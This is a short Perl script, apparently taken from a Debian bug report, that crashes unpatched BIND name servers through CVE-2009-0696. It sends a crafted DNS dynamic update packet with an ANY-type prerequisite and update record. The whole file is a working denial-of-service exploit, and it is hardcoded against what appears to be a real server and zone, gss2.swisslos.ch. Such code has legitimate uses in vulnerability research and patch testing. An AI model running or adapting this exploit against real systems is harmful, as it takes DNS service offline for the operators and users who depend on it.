#!/usr/bin/perl -w

# Crashes an unpatched BIND name server using vulnerability
# VU#725188 / CVE-2009-0696. Author unknown. Retrieved from
# <http://bugs.debian.org/cgi-bin/bugreport.cgi?bug=538975>

use Net::DNS;
use warnings;

# Name of the name server you want to crash
our $NSI = 'gss2.swisslos.ch';
#our $NSI_KEY_NAME = '<key name>';
#our $NSI_KEY = '<key>';

# The name server MUST be a master for this zone
my $rzone = 'swisslos.ch';
# And this resource record MUST exist
my $rptr  = "$rzone";

my $packet = Net::DNS::Update->new($rzone);

$packet->push(
    pre => Net::DNS::RR->new(
        Name  => $rptr,
        Class => 'IN',
        Type  => 'ANY',
        TTL   => 0,
    )
);
$packet->push(
    update => Net::DNS::RR->new(
        Name  => $rptr,
        Class => 'ANY',
        Type  => 'ANY',
    )
);

$packet->sign_tsig( $NSI_KEY_NAME, $NSI_KEY ) if $NSI_KEY_NAME && $NSI_KEY;

print $packet->string;

Net::DNS::Resolver->new( nameservers => [$NSI] )->send($packet);